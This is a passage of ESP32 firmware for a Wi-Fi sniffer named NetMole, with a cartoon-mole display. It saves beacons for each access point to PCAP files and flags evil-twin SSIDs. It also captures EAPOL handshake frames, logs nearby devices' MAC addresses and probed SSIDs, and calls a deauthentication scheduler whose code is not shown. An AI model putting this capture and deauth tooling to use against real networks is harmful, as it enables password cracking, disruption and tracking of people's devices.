  tsUsec     = pendingTsUsec;
  len        = pendingLen;
  pktType    = pendingType;
  pktChannel = pendingChannel;
  pktRSSI    = pendingRSSI;
  memcpy(localBuf, pendingPacket, len);
  packetPending = false;
  interrupts();

  uint8_t bssid[6];
  char ssid[33];
  uint8_t ssidLen = 0;

  // Beacon path: learn AP + create per-AP PCAP
  if (pktType == WIFI_PKT_MGMT && parseBeacon(localBuf, len, bssid, ssid, &ssidLen)) {
    int idx = findAPByBSSID(bssid);

    if (idx < 0) {
      // Check for evil twin BEFORE creating the record so the cache doesn't include this AP yet
      if (SUSPICIOUS_DETECTION_ENABLED && ssidLen > 0) {
        int twinIdx = findEvilTwin(ssid, bssid);
        if (twinIdx >= 0) {
          logSuspiciousAP("(Evil-Twin)", ssid, bssid, pktChannel, pktRSSI);
          triggerAlert();
        }
      }

      idx = createAPRecord(bssid, ssid, ssidLen, pktChannel);
      if (idx >= 0) {
        Serial.printf("New AP: %s on ch %d\n", apCache[idx].ssid, pktChannel);

        // Check if SSID matches known suspicious names
        if (SUSPICIOUS_DETECTION_ENABLED && ssidLen > 0 && isSuspiciousSSID(ssid)) {
          logSuspiciousAP("Suspicious-SSID", ssid, bssid, pktChannel, pktRSSI);
          triggerAlert();
        }

        bool newApLogged = false;
        if (sdReady) {
          if (appendPacketToFile(apCache[idx].filePath, tsSec, tsUsec, localBuf, len)) {
            Serial.printf("Created beacon PCAP: %s\n", apCache[idx].filePath);
            apCache[idx].fileCreated = true;
            newApLogged = true;
          } else {
            Serial.println("Failed to create beacon PCAP");
          }
        }

        // Treasure! means something worth keeping just happened.
        // Trigger it when a brand-new AP gets its PCAP created and the
        // first beacon is successfully written into that file.
        if (newApLogged) {
          triggerAlert();
        }

        // Mark this as interesting activity so the resting timer resets.
        markInterestingActivity();

        // A newly discovered AP wakes NetMole fully if it was Resting.
        if (scannerState == STATE_IDLE) {
          wakeFromIdleBurrow();
          Serial.println("New AP found, leaving Resting");
        }
        markInterestingActivity();

        // Short one-time dwell only when an AP is first discovered.
        stickyChannelActive = true;
        stickyChannelUntilMs = millis() + FIRST_AP_DISCOVERY_DWELL_MS; // Adjust short first-discovery dwell above
      }
    } else {
      apCache[idx].channel = pktChannel;
      apCache[idx].packetCount++;
    }

    // Ordinary beacons should help discover APs, but should NOT keep extending sticky dwell.
    return;
  }

  // EAPOL path: map traffic back to known AP
  if (isEAPOLPacket(localBuf, len)) {
    if (len >= 22) {
      memcpy(bssid, localBuf + 16, 6);
      int idx = findAPByBSSID(bssid);
      if (idx >= 0) {
        apCache[idx].channel = pktChannel;
        apCache[idx].packetCount++;

        if (sdReady && EAPOL_LOGGING_ENABLED) {
          if (appendPacketToFile(apCache[idx].eapolFilePath, tsSec, tsUsec, localBuf, len)) {
            Serial.printf("EAPOL logged for %s on ch %d\n", apCache[idx].ssid, pktChannel);
          } else {
            Serial.println("Failed to append EAPOL to EAPOL PCAP");
          }
        }

        markInterestingActivity();
        if (scannerState == STATE_IDLE) {
          wakeFromIdleBurrow();
          Serial.println("Interesting traffic found, leaving Resting");
        }
        markInterestingActivity();
        engageStickyDwell(pktChannel);  // Extend sticky dwell when interesting packets arrive
        triggerAlert();
      }
    }
  }

  // Probe request path: log device MAC and requested SSID to probes.txt
  if (PROBE_LOGGING_ENABLED && pktType == WIFI_PKT_MGMT) {
    uint8_t probeMAC[6];
    char probeSSID[33];
    uint8_t probeSSIDLen = 0;

    if (parseProbe(localBuf, len, probeMAC, probeSSID, &probeSSIDLen)) {
      if (probeSSIDLen > 0 || PROBE_LOG_HIDDEN) {
        logProbeToFile(probeMAC, probeSSID, probeSSIDLen, pktChannel, pktRSSI);
        Serial.printf("Probe: %02X:%02X:%02X:%02X:%02X:%02X -> \"%s\" ch%d %ddBm\n",
                      probeMAC[0], probeMAC[1], probeMAC[2],
                      probeMAC[3], probeMAC[4], probeMAC[5],
                      probeSSIDLen > 0 ? probeSSID : "[wildcard]",
                      pktChannel, pktRSSI);
      }
    }
  }
}

// ============================================================
// Optional touch placeholder
// ============================================================
void updateTouchUI() {
  // future touch logic goes here
}

// ============================================================
// Setup
// ============================================================
// ============================================================
// Boot splash screen
// ============================================================
void showSplash() {
  if (SPLASH_DURATION_MS == 0) return;
  tft.pushImage(0, 0, NETMOLE_SPLASH_WIDTH, NETMOLE_SPLASH_HEIGHT, netmole_splash);
  delay(SPLASH_DURATION_MS);
  tft.fillScreen(TFT_BLACK);
}

// ============================================================
// Setup
// ============================================================
void setup() {
  Serial.begin(115200);
  delay(300);

  tft.init();
  tft.setRotation(1);
  tft.setSwapBytes(true);
  tft.setTextWrap(false);
  tft.fillScreen(TFT_BLACK);

  showSplash();

  memset(apCache, 0, sizeof(apCache));

  currentFrame = MOLE_FORWARD_GREEN;
  markInterestingActivity();
  fullRedraw();

  sdReady = initSDCard();
  if (!sdReady) {
    Serial.println("SD logging unavailable");
  }

  initSniffer();

  Serial.println("Mole AP sniffer started");
}

// ============================================================
// Main loop
// ============================================================
void loop() {
  updateTouchUI();
  updateIdleBurrowState();
  updateChannelDwell();
  updateDeauthSchedule();
  processPendingPacket();
  updateMoleAnimation();

// ============================================================
//  Serial output for RX/MGMT/DATA/CH/APs/Mode
// ============================================================  
  // static unsigned long lastDbgMs = 0;
  // if (millis() - lastDbgMs > 1000) {
  //   lastDbgMs = millis();
  //   Serial.printf("RX:%lu MGMT:%lu DATA:%lu CH:%u APs:%d Mode:%s\n",
  //                 g_rxCount,
  //                 g_mgmtCount,
  //                 g_dataCount,
  //                 currentChannel,
  //                 apCount,
  //                 stickyChannelActive ? "STICKY" : "SWEEP");
  // }
// ============================================================  

  unsigned long now = millis();

  if (currentFrame != lastDrawnFrame) {
    drawMole(currentFrame);
  }

  if (now - lastUiMs >= UI_REFRESH_MS) {
    lastUiMs = now;
    drawHeader();
    drawStatus();
    drawInfo();
    drawFooterSSID();
  }
}
